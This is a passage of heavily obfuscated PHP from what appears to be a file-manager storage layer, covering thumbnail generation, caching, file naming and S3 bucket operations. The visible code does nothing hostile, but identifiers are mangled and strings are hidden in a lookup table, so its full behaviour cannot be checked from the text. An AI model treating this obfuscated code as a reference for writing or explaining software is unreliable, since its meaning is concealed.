($¿Ø•©¦) { $ì®é²Æ¼ = intval(1000 * 1000 * (timeFloat() - $›¼é°­›)); $ŞùëèÀ— = $¿Ø•©¦ - $ì®é²Æ¼; if ($ŞùëèÀ— > 5) { usleep($ŞùëèÀ—); } } } } public function fileOutServer($Ğ“æ¾ı, $–ÔóæØ = false, $Ÿ„¡—Ğè = false, $Ø¨¥»ºã = '') { $this->fileOut($Ğ“æ¾ı, $–ÔóæØ, $Ÿ„¡—Ğè, $Ø¨¥»ºã); } public function fileOutLink($´¤Ê×ùĞ) { header($_SERVER[‚ûòÉ˜ş][172] . $´¤Ê×ùĞ); die; } public function cacheMethod($©ƒò¿ÆÜ, $µô¢¬İŸ, $†˜­¡¿¼ = null) { $Ğ˜Şˆí¬ =& $_SERVER[‚ûòÉ˜ş]; static $ÇÀåçÌı = array(); $¼Œ­Åµô = $µô¢¬İŸ ? ltrim($this->getPathOuter($µô¢¬İŸ), $Ğ˜Şˆí¬[8]) : $Ğ˜Şˆí¬[12]; $´Øçğî‚ = $Ğ˜Şˆí¬[173] . $©ƒò¿ÆÜ . $Ğ˜Şˆí¬[174] . rtrim($¼Œ­Åµô, $Ğ˜Şˆí¬[8]); if (is_null($©ƒò¿ÆÜ)) { $ÇÀåçÌı = array(); return; } if (is_null($µô¢¬İŸ)) { foreach ($ÇÀåçÌı as $´Øçğî‚ => $å¤¸Ø¯­) { if (!strstr($´Øçğî‚, $Ğ˜Şˆí¬[173] . $©ƒò¿ÆÜ . $Ğ˜Şˆí¬[175])) { continue; } unset($ÇÀåçÌı[$´Øçğî‚]); } return; } if (!is_null($†˜­¡¿¼)) { $ÇÀåçÌı[$´Øçğî‚] = $†˜­¡¿¼; return; } $ó³³Õ¯Ş = isset($ÇÀåçÌı[$´Øçğî‚]) ? $ÇÀåçÌı[$´Øçğî‚] : null; if (!is_null($ó³³Õ¯Ş)) { return $ó³³Õ¯Ş; } $ó³³Õ¯Ş = $this->{$©ƒò¿ÆÜ}($µô¢¬İŸ); $ÇÀåçÌı[$´Øçğî‚] = $ó³³Õ¯Ş; return $ó³³Õ¯Ş; } public function cacheMethodInfoSet($ÇíÔó·˜, $‹¶éîÑĞ, $›¬–Ôò¡ = false) { $—ïàñ×á =& $_SERVER[‚ûòÉ˜ş]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($—ïàñ×á[176], $ÇíÔó·˜, $‹¶éîÑĞ); $this->cacheMethod($—ïàñ×á[177], $ÇíÔó·˜, $‹¶éîÑĞ ? !1 : !0); if (is_array($›¬–Ôò¡)) { $this->cacheMethod($—ïàñ×á[178], $ÇíÔó·˜, $›¬–Ôò¡); } } public function fileOutImage($à©ùåå™, $ªĞÁÛºş = 250) { $¿¹›Ç÷ã =& $_SERVER[‚ûòÉ˜ş]; set_timeout(); if (substr($à©ùåå™, 0, 4) == $¿¹›Ç÷ã[159]) { $this->fileOutLink($à©ùåå™); } $§¿»õıÅ = $this->info($à©ùåå™); $©‘¾â›Å = !1; $ÒƒôÖÆ = isset($GLOBALS[$¿¹›Ç÷ã[179]]) ? $GLOBALS[$¿¹›Ç÷ã[179]] : array(); if ($ÒƒôÖÆ && $ÒƒôÖÆ[$¿¹›Ç÷ã[180]] == $§¿»õıÅ[$¿¹›Ç÷ã[94]]) { $§¿»õıÅ = $ÒƒôÖÆ; $àÆ•æè = $§¿»õıÅ[$¿¹›Ç÷ã[181]]; if ($àÆ•æè && isset($àÆ•æè[$¿¹›Ç÷ã[182]])) { if ($àÆ•æè[$¿¹›Ç÷ã[182]] <= $ªĞÁÛºş && $àÆ•æè[$¿¹›Ç÷ã[183]] <= $ªĞÁÛºş) { $©‘¾â›Å = !0; } } } if ($§¿»õıÅ[$¿¹›Ç÷ã[86]] <= 1024 * 50 || $©‘¾â›Å || !function_exists($¿¹›Ç÷ã[184]) || $§¿»õıÅ[$¿¹›Ç÷ã[185]] == $¿¹›Ç÷ã[186]) { return $this->fileOut($à©ùåå™, !1, $§¿»õıÅ[$¿¹›Ç÷ã[42]]); } $ê·Ÿ—± = kodIO::hashPath($§¿»õıÅ); $àÁÉÆ¹ò = "\x63\157\166\x65\162\137{$ê·Ÿ—±}\x5f{$ªĞÁÛºş}\x2e\x70\156\x67"; $¨¿ìµ—Ÿ = IO_PATH_SYSTEM_TEMP . $¿¹›Ç÷ã[187]; $Ê¨½ÃÇŒ = IO::infoFullSimple($¨¿ìµ—Ÿ); $¶ŠâÇÊ¶ = $Ê¨½ÃÇŒ && is_array($Ê¨½ÃÇŒ) ? $Ê¨½ÃÇŒ[$¿¹›Ç÷ã[94]] : $¿¹›Ç÷ã[12]; if (!$¶ŠâÇÊ¶) { $¶ŠâÇÊ¶ = IO::mkdir($¨¿ìµ—Ÿ); } if ($§¿»õıÅ[$¿¹›Ç÷ã[188]] == $¿¹›Ç÷ã[189] && isset($§¿»õıÅ[$¿¹›Ç÷ã[190]]) && $§¿»õıÅ[$¿¹›Ç÷ã[190]] == kodIO::sourceID($¶ŠâÇÊ¶)) { $Ú¨“î­ä = $§¿»õıÅ[$¿¹›Ç÷ã[191]]; if ($ªĞÁÛºş <= 500) { $î›ÆÓ˜ò = preg_replace($¿¹›Ç÷ã[192], $¿¹›Ç÷ã[193], $§¿»õıÅ[$¿¹›Ç÷ã[42]]); $Ú¨“î­ä = IO::fileNameExist($¶ŠâÇÊ¶, $î›ÆÓ˜ò); } return IO::fileOut(KodIO::make($Ú¨“î­ä), !1, $§¿»õıÅ[$¿¹›Ç÷ã[42]]); } $‰œ¥íÆŸ = IO::fileNameExist($¶ŠâÇÊ¶, $àÁÉÆ¹ò); if ($‰œ¥íÆŸ) { return IO::fileOut(KodIO::make($‰œ¥íÆŸ), !1, $§¿»õıÅ[$¿¹›Ç÷ã[42]]); } if ($ªĞÁÛºş > 1000) { $this->makeImageCover($¶ŠâÇÊ¶, $à©ùåå™, $àÁÉÆ¹ò, $ªĞÁÛºş); $this->makeImageCover($¶ŠâÇÊ¶, $à©ùåå™, "\x63\x6f\x76\x65\x72\137{$ê·Ÿ—±}\x5f\62\x35\60\x2e\160\156\147", 250); $‰œ¥íÆŸ = IO::fileNameExist($¶ŠâÇÊ¶, $àÁÉÆ¹ò); if ($‰œ¥íÆŸ) { return IO::fileOut(KodIO::make($‰œ¥íÆŸ), !1, $§¿»õıÅ[$¿¹›Ç÷ã[42]]); } die; } $ƒ•—¯ëÀ = Cache::get($àÁÉÆ¹ò); if ($ƒ•—¯ëÀ == $¿¹›Ç÷ã[194] || $ƒ•—¯ëÀ == $¿¹›Ç÷ã[195]) { echo $ƒ•—¯ëÀ; die; } Cache::set($àÁÉÆ¹ò, $¿¹›Ç÷ã[195], 60); $Î‡œ‹»à = array($¶ŠâÇÊ¶, $§¿»õıÅ[$¿¹›Ç÷ã[94]], $àÁÉÆ¹ò, $ªĞÁÛºş); $‹Ùû¦§‘ = $¿¹›Ç÷ã[196] . $§¿»õıÅ[$¿¹›Ç÷ã[86]] . $¿¹›Ç÷ã[197] . $àÁÉÆ¹ò . $¿¹›Ç÷ã[198] . $§¿»õıÅ[$¿¹›Ç÷ã[42]] . $¿¹›Ç÷ã[199] . $§¿»õıÅ[$¿¹›Ç÷ã[94]]; TaskQueue::add($¿¹›Ç÷ã[200], $Î‡œ‹»à, $‹Ùû¦§‘, $àÁÉÆ¹ò); } public function makeImageCover($¼å¤µşç, $Ì£‡àİ, $Ä‹ø÷ü€, $‰ËË¨§˜) { $£Ø¶Ù˜‰ =& $_SERVER[‚ûòÉ˜ş]; if (IO::fileNameExist($¼å¤µşç, $Ä‹ø÷ü€)) { return $£Ø¶Ù˜‰[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $±üŠŞÉˆ = DATA_THUMB . $Ä‹ø÷ü€; del_file($±üŠŞÉˆ); $óÒĞ½Í… = TEMP_FILES . $Ä‹ø÷ü€; if (!@file_exists($óÒĞ½Í…)) { $óÒĞ½Í… = IO::download($Ì£‡àİ, $óÒĞ½Í…); } if (!@file_exists($óÒĞ½Í…)) { return $£Ø¶Ù˜‰[202]; } ImageThumb::createThumb($óÒĞ½Í…, $±üŠŞÉˆ, $‰ËË¨§˜, $‰ËË¨§˜ * 10); if (@file_exists($±üŠŞÉˆ)) { Cache::remove($Ä‹ø÷ü€); return IO::move($±üŠŞÉˆ, $¼å¤µşç); } Cache::set($Ä‹ø÷ü€, $£Ø¶Ù˜‰[194], 600); del_file($±üŠŞÉˆ); return $£Ø¶Ù˜‰[203] . $óÒĞ½Í… . $£Ø¶Ù˜‰[81]; } public function fileOutImageServer($ÜÄùÑ×, $¡ñ÷´–Û = 250) { $this->fileOutImage($ÜÄùÑ×, $¡ñ÷´–Û); } public function fileNameAuto($°Ã¼Â¤ã, $…°óá³, $”¿ü§ÑÀ = REPEAT_RENAME, $¼¯´´«Ó = false) { $ö¶×å =& $_SERVER[‚ûòÉ˜ş]; $¸û©­– = $°Ã¼Â¤ã === $ö¶×å[12] ? $…°óá³ : rtrim($°Ã¼Â¤ã, $ö¶×å[8]) . $ö¶×å[8] . $…°óá³; if ($”¿ü§ÑÀ == REPEAT_REPLACE || !$this->exist($¸û©­–) || $¼¯´´«Ó && $”¿ü§ÑÀ != REPEAT_RENAME_FOLDER) { return $…°óá³; } if ($”¿ü§ÑÀ == REPEAT_SKIP) { return !1; } $‡Í§Œäó = $ö¶×å[10] . get_path_ext($…°óá³); $‡Í§Œäó = $‡Í§Œäó == $ö¶×å[10] || $¼¯´´«Ó ? $ö¶×å[12] : $‡Í§Œäó; $£éüäâÉ = 1; $²¼ï·˜­ = substr($…°óá³, 0, strlen($…°óá³) - strlen($‡Í§Œäó)); $„éşßş® = $²¼ï·˜­ . "\x28{$£éüäâÉ}\51{$‡Í§Œäó}"; while ($this->exist(rtrim($°Ã¼Â¤ã, $ö¶×å[8]) . $ö¶×å[8] . $„éşßş®)) { $„éşßş® = $²¼ï·˜­ . "\x28{$£éüäâÉ}\51{$‡Í§Œäó}"; $£éüäâÉ++; } return $„éşßş®; } private function fileNameAutoList($¨Ôë±Ñ, $ıÛİğåÔ, $¢Öµ¾ì… = false) { $„Åùó® =& $_SERVER[‚ûòÉ˜ş]; $¨¬¥¢° = $this->listPath($¨Ôë±Ñ, !0); $¨¬¥¢° = array_merge($¨¬¥¢°[$„Åùó®[92]], $¨¬¥¢°[$„Åùó®[93]]); $Ü¢±ÑîŸ = array_to_keyvalue($¨¬¥¢°, $„Åùó®[12], $„Åùó®[42]); $Ÿ…ì³å© = $„Åùó®[10] . get_path_ext($ıÛİğåÔ); $Ÿ…ì³å© = $Ÿ…ì³å© == $„Åùó®[10] || $¢Öµ¾ì… ? $„Åùó®[12] : $Ÿ…ì³å©; $âÅñ–íŠ = substr($ıÛİğåÔ, 0, strlen($ıÛİğåÔ) - strlen($Ÿ…ì³å©)); $ı×‚÷¸¥ = $âÅñ–íŠ . "\50\x30\x29{$Ÿ…ì³å©}"; for ($ê®æô“ = 1; $ê®æô“ <= count($Ü¢±ÑîŸ) + 1; $ê®æô“++) { $ı×‚÷¸¥ = $âÅñ–íŠ . "\x28{$ê®æô“}\51{$Ÿ…ì³å©}"; if (!in_array_not_case($ı×‚÷¸¥, $Ü¢±ÑîŸ)) { return $ı×‚÷¸¥; } } return $ı×‚÷¸¥; } public function listAllFiles($ŸÑÚæğ, $‡£Áˆø¯) { $ã·‘Óïã =& $_SERVER[‚ûòÉ˜ş]; if (empty($‡£Áˆø¯)) { return array(); } $Ø•ÏÈÕƒ = array_keys($‡£Áˆø¯); $˜îíÎ…» = array(); $ŸÑÚæğ = trim($ŸÑÚæğ, $ã·‘Óïã[8]); foreach ($‡£Áˆø¯ as $š¿“ş¹¬ => $ûı¿ÌÉŒ) { $ë³‡Ò·ö = ltrim(substr(trim($š¿“ş¹¬, $ã·‘Óïã[8]), strlen($ŸÑÚæğ)), $ã·‘Óïã[8]); if (substr($š¿“ş¹¬, -1) == $ã·‘Óïã[8]) { $ë³‡Ò·ö = rtrim($ë³‡Ò·ö, $ã·‘Óïã[8]) . $ã·‘Óïã[8]; } $˜îíÎ…» = array_merge($˜îíÎ…», $this->slicePath($ë³‡Ò·ö)); } $Í²¦àÑ© = array(); foreach (array_unique($˜îíÎ…») as $¼ˆÉèÂ) { $¶Æï¥ = array($ã·‘Óïã[94] => $this->getPathOuter($ã·‘Óïã[8] . $ŸÑÚæğ . $ã·‘Óïã[8] . $¼ˆÉèÂ), $ã·‘Óïã[85] => 1, $ã·‘Óïã[86] => 0); if (substr($¼ˆÉèÂ, -1) != $ã·‘Óïã[8]) { $¶Æï¥[$ã·‘Óïã[85]] = 0; $§°£¢Â = $this->getPath($ŸÑÚæğ . $ã·‘Óïã[8] . $¼ˆÉèÂ); if (isset($‡£Áˆø¯[$§°£¢Â])) { $¨ªİõšò = $‡£Áˆø¯[$§°£¢Â]; if (isset($¨ªİõšò[$ã·‘Óïã[86]])) { $¶Æï¥[$ã·‘Óïã[86]] = intval($¨ªİõšò[$ã·‘Óïã[86]]); } if (isset($¨ªİõšò[$ã·‘Óïã[204]])) { $¶Æï¥[$ã·‘Óïã[95]] = intval($¨ªİõšò[$ã·‘Óïã[204]]); } } } $Í²¦àÑ©[] = $¶Æï¥; } return $Í²¦àÑ©; } public function slicePath($ÉÛêÀùğ) { $§’ˆ¶Ğ =& $_SERVER[‚ûòÉ˜ş]; $¿ôñµ¤© = explode($§’ˆ¶Ğ[8], trim($ÉÛêÀùğ, $§’ˆ¶Ğ[8])); $¡¸šÕŠ„ = 0; do { ++$¡¸šÕŠ„; $Æ™„â‹á[] = implode($§’ˆ¶Ğ[8], array_slice($¿ôñµ¤©, 0, $¡¸šÕŠ„)) . $§’ˆ¶Ğ[8]; } while ($¡¸šÕŠ„ < count($¿ôñµ¤©)); $Æ™„â‹á[count($¿ôñµ¤©) - 1] = $ÉÛêÀùğ; return $Æ™„â‹á; } public function getHost() { $¯¥Ìƒ²Ï =& $_SERVER[‚ûòÉ˜ş]; $ØÙ§¹é× = parse_url(trim($this->domain, $¯¥Ìƒ²Ï[8])); $‚¾éƒ = isset($ØÙ§¹é×[$¯¥Ìƒ²Ï[205]]) ? $ØÙ§¹é×[$¯¥Ìƒ²Ï[205]] : http_type(); $ëÉÊè¿¥ = isset($ØÙ§¹é×[$¯¥Ìƒ²Ï[206]]) ? $ØÙ§¹é×[$¯¥Ìƒ²Ï[206]] : $ØÙ§¹é×[$¯¥Ìƒ²Ï[94]]; if (isset($ØÙ§¹é×[$¯¥Ìƒ²Ï[207]])) { $ëÉÊè¿¥ .= $¯¥Ìƒ²Ï[4] . $ØÙ§¹é×[$¯¥Ìƒ²Ï[207]]; } return $‚¾éƒ . $¯¥Ìƒ²Ï[208] . $ëÉÊè¿¥; } public function pathEncode($Ûğøú›“) { $ı‰¼º®æ =& $_SERVER[‚ûòÉ˜ş]; return str_replace($ı‰¼º®æ[209], $ı‰¼º®æ[8], rawurlencode($Ûğøú›“)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($×€¯ÒŸŒ) { set_timeout(); require_once SDK_DIR . $_SERVER[‚ûòÉ˜ş][210]; parent::__construct(); $this->_init($×€¯ÒŸŒ); } public function _init($¹˜•áÓ„) { $this->config = $¹˜•áÓ„; foreach ($¹˜•áÓ„ as $ı—Áîšï => $ÚüÙú„Ú) { if (isset($this->{$ı—Áîšï})) { $this->{$ı—Áîšï} = $ÚüÙú„Ú; } } $this->endpoint = $¹˜•áÓ„[$_SERVER[‚ûòÉ˜ş][211]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¥´½õÔÍ = "\166\64") { $this->signVer = $¥´½õÔÍ; $this->client->setSignatureVersion($¥´½õÔÍ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ïØÉ°èŒ =& $_SERVER[‚ûòÉ˜ş]; $èÈµ¹ØŞ = $this->getBucketCors(); if (!$èÈµ¹ØŞ || !is_array($èÈµ¹ØŞ)) { return !1; } if ($èÈµ¹ØŞ[$ïØÉ°èŒ[212]] != $ïØÉ°èŒ[213] || $èÈµ¹ØŞ[$ïØÉ°èŒ[214]] != $ïØÉ°èŒ[213]) { return !1; } $®«Œ§Ò‡ = array_map($ïØÉ°èŒ[215], $èÈµ¹ØŞ[$ïØÉ°èŒ[216]]); if (!is_array($®«Œ§Ò‡)) { $®«Œ§Ò‡ = array(); } $ùØØÛ¶¿ = array($ïØÉ°èŒ[217], $ïØÉ°èŒ[218], $ïØÉ°èŒ[219], $ïØÉ°èŒ[220], $ïØÉ°èŒ[221]); $²ÆüâÕø = array_diff($ùØØÛ¶¿, $®«Œ§Ò‡); return empty($²ÆüâÕø); } public function mkfile($¶‘ï£Á©, $Ñ¡ıô›å = '', $Ê©Ô­ïˆ = REPEAT_RENAME) { $æªĞ‘Ùï = $this->setContent($¶‘ï£Á©, $Ñ¡ıô›å); if ($æªĞ‘Ùï !== !1) { return $this->getPathOuter($¶‘ï£Á©); } return !1; } public function mkdir($äÏ È“Ä, $òµµêò¯ = REPEAT_SKIP) { $Óæ±¤üÃ =& $_SERVER[‚ûòÉ˜ş]; if (empty($äÏ È“Ä) && $äÏ È“Ä !== $Óæ±¤üÃ[222]) { return !1; } if ($òµµêò¯ && $this->_isFolder($äÏ È“Ä)) { return $this->getPathOuter($äÏ È“Ä); } $Õ¢·ˆ“£ = $this->setContent($äÏ È“Ä, $Óæ±¤üÃ[12], !0); if ($Õ¢·ˆ“£ !== !1) { return $this->getPathOuter($äÏ È“Ä); } return !1; } public function copyFile($òùÔëµ, $ÙÈ¨ŞÀ¶, $ßœÅÜ˜É = array()) { $­Çè¤İ =& $_SERVER[‚ûòÉ˜ş]; $¡ö£§Àş = $this->objectMeta($òùÔëµ); if (!$¡ö£§Àş) { return !1; } if ($¡ö£§Àş[$­Çè¤İ[86]] <= 1024 * 1024 * 200) { $ş¢ÕéíÁ = $this->client->copyObject($this->bucket, $òùÔëµ, $this->bucket, $ÙÈ¨ŞÀ¶, $­Çè¤İ[223], $ßœÅÜ˜É); } else { $ş¢ÕéíÁ = $this->client->multiCopyObject($this->bucket, $òùÔëµ, $this->bucket, $ÙÈ¨ŞÀ¶, $ßœÅÜ˜É); } $ş¢ÕéíÁ = $ş¢ÕéíÁ ? $this->getPathOuter($ÙÈ¨ŞÀ¶) : !1; return $ş¢ÕéíÁ; } public function moveFile($Å¯µ»à», $ÀÃáœœ ) { if ($this->copyFile($Å¯µ»à», $ÀÃáœœ )) { $this->delFile($Å¯µ»à»); return $this->getPathOuter($ÀÃáœœ ); } return !1; } public function delFile($Üøäó©) { return $this->client->deleteObject($this->bucket, $Üøäó©); } public function delFolder($ÊÍå€¬Ø) { $ØáÏ¡Èğ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->exist($ÊÍå€¬Ø)) { return !0; } $this->listItemCache = !1; $•®Ô±è‡ = $this->fileList($ÊÍå€¬Ø); $this->listItemCache = !0; $¦Á•æ÷¡ = trim($ÊÍå€¬Ø, $ØáÏ¡Èğ[8]) . $ØáÏ¡Èğ[8]; if (!empty($ÊÍå€¬Ø) && $ÊÍå€¬Ø !== $ØáÏ¡Èğ[222] && !in_array($¦Á•æ÷¡, $•®Ô±è‡[$ØáÏ¡Èğ[92]])) { $•®Ô±è‡[$ØáÏ¡Èğ[92]][] = $¦Á•æ÷¡; } $ÑêŞ¯ëø = $this->delByBatch($•®Ô±è‡[$ØáÏ¡Èğ[93]]); if (!$ÑêŞ¯ëø) { return !1; } $ÑêŞ¯ëø = $this->delByBatch($•®Ô±è‡[$ØáÏ¡Èğ[92]]); if (!$ÑêŞ¯ëø) { return !1; } return $this->delFile($¦Á•æ÷¡); } private function delByBatch($÷ÌÄ¥¤Ç) { foreach (array_chunk($÷ÌÄ¥¤Ç, 1000) as $ÜÇ©°à¸) { $ÉÕ‹ô·ê = $this->client->deleteObjects($this->bucket, $ÜÇ©°à¸); if (!$ÉÕ‹ô·ê) { return !1; } } return !0; } public function rename($Ã»…‹ı, $Ã¿ì¢) { return $this->renameObject($Ã»…‹ı, $Ã¿ì¢); } public function listPath($Ò­òŞ , $àšéúúÄ = false) { $ó¡Å‰§· =& $_SERVER[‚ûòÉ˜ş]; $‚ÃèûÙ€ = $this->fileList($Ò­òŞ , $ó¡Å‰§·[8], !0); foreach ($‚ÃèûÙ€[$ó¡Å‰§·[92]] as $¹•î²–‡ => $ÎÓ¹­ë¹) { $‚ÃèûÙ€[$ó¡Å‰§·[92]][$¹•î²–‡] = $this->folderInfo($ÎÓ¹­ë¹, $àšéúúÄ, $ÎÓ¹­ë¹); } foreach ($‚ÃèûÙ€[$ó¡Å‰§·[93]] as $¹•î²–‡ => $ÎÓ¹­ë¹) { $‚ÃèûÙ€[$ó¡Å‰§·[93]][$¹•î²–‡] = $this->fileInfo($ÎÓ¹­ë¹[$ó¡Å‰§·[42]], $àšéúúÄ, $ÎÓ¹­ë¹); } return $‚ÃèûÙ€; } protected function infoChildren($ğ°Ä©Â±, &$ÜìË¢„Š) { $ÜÖ¤˜ê =& $_SERVER[‚ûòÉ˜ş]; $ÒÅŞÚ¢Í = $this->fileList($ğ°Ä©Â±, $ÜÖ¤˜ê[12], !0); $ÜìË¢„Š[$ÜÖ¤˜ê[88]] += count($ÒÅŞÚ¢Í[$ÜÖ¤˜ê[92]]); $ÜìË¢„Š[$ÜÖ¤˜ê[87]] += count($ÒÅŞÚ¢Í[$ÜÖ¤˜ê[93]]); foreach ($ÒÅŞÚ¢Í[$ÜÖ¤˜ê[93]] as $÷û•Ğ¾) { if (!$÷û•Ğ¾ || !$÷û•Ğ¾[$ÜÖ¤˜ê[86]]) { continue; } $ÜìË¢„Š[$ÜÖ¤˜ê[86]] += $÷û•Ğ¾[$ÜÖ¤˜ê[86]]; } } private function fileInfo($‚¡¼”õë, $Ó¤³õù‰ = false, $¥ÓÙÆàÀ = array()) { $°ØôÖ’¥ =& $_SERVER[‚ûòÉ˜ş]; $¿„î¥ã… = array($°ØôÖ’¥[42] => $this->pathThis($‚¡¼”õë), $°ØôÖ’¥[94] => $this->getPathOuter($‚¡¼”õë), $°ØôÖ’¥[43] => $°ØôÖ’¥[224], $°ØôÖ’¥[185] => $this->ext($‚¡¼”õë), $°ØôÖ’¥[86] => isset($¥ÓÙÆàÀ[$°ØôÖ’¥[86]]) ? $¥ÓÙÆàÀ[$°ØôÖ’¥[86]] : 0); if ($Ó¤³õù‰) { return $¿„î¥ã…; } $¿„î¥ã…[$°ØôÖ’¥[225]] = $¿„î¥ã…[$°ØôÖ’¥[95]] = 0; $¿„î¥ã…[$°ØôÖ’¥[226]] = $¿„î¥ã…[$°ØôÖ’¥[227]] = !0; if (empty($¥ÓÙÆàÀ)) { $¥ÓÙÆàÀ = $this->objectMeta($‚¡¼”õë); if (!$¥ÓÙÆàÀ) { return $¿„î¥ã…; } } if (isset($¥ÓÙÆàÀ[$°ØôÖ’¥[228]]) && $¥ÓÙÆàÀ[$°ØôÖ’¥[228]]) { $¿„î¥ã…[$°ØôÖ’¥[229]] = $¥ÓÙÆàÀ[$°ØôÖ’¥[228]]; } if (isset($¥ÓÙÆàÀ[$°ØôÖ’¥[204]])) { $¿„î¥ã…[$°ØôÖ’¥[95]] = $¥ÓÙÆàÀ[$°ØôÖ’¥[204]]; } if (isset($¥ÓÙÆàÀ[$°ØôÖ’¥[86]])) { $¿„î¥ã…[$°ØôÖ’¥[86]] = $¥ÓÙÆàÀ[$°ØôÖ’¥[86]]; } return $¿„î¥ã…; } private function folderInfo($²¦¶æƒ, $œÜ”…÷ = false, $æÇæ­åÏ = array()) { $²àõ¼šÉ =& $_SERVER[‚ûòÉ˜ş]; $Ÿåêğò± = array($²àõ¼šÉ[42] => $this->pathThis($²¦¶æƒ), $²àõ¼šÉ[94] => $this->getPathOuter($²àõ¼šÉ[8] . $²¦¶æƒ), $²àõ¼šÉ[43] => $²àõ¼šÉ[85]); if ($œÜ”…÷) { return $Ÿåêğò±; } $Ÿåêğò±[$²àõ¼šÉ[225]] = $Ÿåêğò±[$²àõ¼šÉ[95]] = 0; $Ÿåêğò±[$²àõ¼šÉ[226]] = $Ÿåêğò±[$²àõ¼šÉ[227]] = !0; if ($²¦¶æƒ == $²àõ¼šÉ[12]) { return $Ÿåêğò±; } if (empty($æÇæ­åÏ)) { $æÇæ­åÏ = $this->objectMeta(trim($²¦¶æƒ, $²àõ¼šÉ[8]) . $²àõ¼šÉ[8]); } if (isset($æÇæ­åÏ[$²àõ¼šÉ[204]])) { $Ÿåêğò±[$²àõ¼šÉ[225]] = $æÇæ­åÏ[$²àõ¼šÉ[204]]; } return $Ÿåêğò±; } private function fileList($ĞòœùÓ¯, $óÍ¯Ğ¿Ó = '', $äš™ÍÇó = 0) { $²Ù‡‚Á =& $_SERVER[‚ûòÉ˜ş]; $©Íôõ”ˆ = rtrim($ĞòœùÓ¯, $²Ù‡‚Á[8]) . $²Ù‡‚Á[8]; $Ñ§äóå = $this->listObjs($©Íôõ”ˆ, null, null, $óÍ¯Ğ¿Ó); if (!$Ñ§äóå) { return array($²Ù‡‚Á[92] => array(), $²Ù‡‚Á[93] => array()); } $›œæ”Èã = $û¿ÓÆÍ = array(); foreach ($Ñ§äóå[$²Ù‡‚Á[230]] as $¥í×Ğ¿) { $»ÖÔ›À = $¥í×Ğ¿[$²Ù‡‚Á[42]]; if ($»ÖÔ›À == $©Íôõ”ˆ) { continue; } $ãè…ã…ê = isset($¥í×Ğ¿[$²Ù‡‚Á[86]]) ? $¥í×Ğ¿[$²Ù‡‚Á[86]] : 0; $Úùæó®â = $ãè…ã…ê == 0 && substr($»ÖÔ›À, strlen($»ÖÔ›À) - 1, 1) == $²Ù‡‚Á[8] ? !0 : !1; $this->cacheMethodInfoSet($»ÖÔ›À, $Úùæó®â, $¥í×Ğ¿); if ($Úùæó®â) { $›œæ”Èã[] = $»ÖÔ›À; continue; } $û¿ÓÆÍ[] = $äš™ÍÇó ? $¥í×Ğ¿ : $»ÖÔ›À; } foreach ($Ñ§äóå[$²Ù‡‚Á[231]] as $¥í×Ğ¿) { $›œæ”Èã[] = $¥í×Ğ¿[$²Ù‡‚Á[42]]; $this->cacheMethodInfoSet($¥í×Ğ¿[$²Ù‡‚Á[42]], !0); } $this->cacheMethodInfoSet($ĞòœùÓ¯, !0); return array($²Ù‡‚Á[92] => $›œæ”Èã, $²Ù‡‚Á[93] => $û¿ÓÆÍ); } private function listObjs($ì Íƒ¨Ô, $çí‰‡¨ù = null, $·şÇ¼±Š = null, $¤ìŸğå = null) { $õ¼Ö€Æõ =& $_SERVER[‚ûòÉ˜ş]; $ì Íƒ¨Ô = trim($ì Íƒ¨Ô, $õ¼Ö€Æõ[8]); $ÒØ‘ªã– = empty($ì Íƒ¨Ô) && $ì Íƒ¨Ô !== $õ¼Ö€Æõ[222] ? $õ¼Ö€Æõ[12] : $ì Íƒ¨Ô . $õ¼Ö€Æõ[8]; return $this->client->getBucket($this->bucket, $ÒØ‘ªã–, $çí‰‡¨ù, $·şÇ¼±Š, $¤ìŸğå, !0); } public function has($‰ûòÚ±, $§³ü®½Ì = false, $ÎâºÉƒ¾ = true) { $©Ğ£ğ =& $_SERVER[‚ûòÉ˜ş]; $‰ûòÚ± = trim($‰ûòÚ±, $©Ğ£ğ[8]); $‹üôÛ«¬ = empty($‰ûòÚ±) && $‰ûòÚ± !== $©Ğ£ğ[222] ? $©Ğ£ğ[12] : $‰ûòÚ± . $©Ğ£ğ[8]; $­ôñü¹ = null; $²ÖØÍáÊ = 500; $‡ùÇ”  = $©Ğ£ğ[8]; $¬àèºˆ± = $Ïû–Ñä® = array(); while (!0) { $±ˆ­ü”Á = $this->listObjs($‰ûòÚ±, $­ôñü¹, $²ÖØÍáÊ, $‡ùÇ” ); if (!$±ˆ­ü”Á) { break; } $­ôñü¹ = $±ˆ­ü”Á[$©Ğ£ğ[232]]; $Šö¦Ô¶„ = $±ˆ­ü”Á[$©Ğ£ğ[230]]; $Ù‰ëÂÓ‰ = $±ˆ­ü”Á[$©Ğ£ğ[231]]; if (empty($Šö¦Ô¶„) && empty($Ù‰ëÂÓ‰)) { break; } if (count($Šö¦Ô¶„) == 1 && $Šö¦Ô¶„[0][$©Ğ£ğ[42]] == $‹üôÛ«¬) { break; } if ($§³ü®½Ì) { if (count($Šö¦Ô¶„)) { $Šö¦Ô¶„ = array_column($Šö¦Ô¶„, $©Ğ£ğ[42]); $¬àèºˆ± = array_merge($¬àèºˆ±, $Šö¦Ô¶„); } if (count($Ù‰ëÂÓ‰)) { $Ù‰ëÂÓ‰ = array_column($Ù‰ëÂÓ‰, $©Ğ£ğ[42]); $Ïû–Ñä® = array_merge($Ïû–Ñä®, $Ù‰ëÂÓ‰); } if ($­ôñü¹ === null) { break; } continue; } if ($ÎâºÉƒ¾) { if (!empty($Šö¦Ô¶„)) { if (count($Šö¦Ô¶„) > 1 || isset($Šö¦Ô¶„[0][$©Ğ£ğ[42]]) && $Šö¦Ô¶„[0][$©Ğ£ğ[42]] != $‹üôÛ«¬) { return !0; } } } else { if (!empty($Ù‰ëÂÓ‰)) { return !0; } } if ($­ôñü¹ === null) { break; } } if ($§³ü®½Ì) { $¬àèºˆ± = array_diff($¬àèºˆ±, 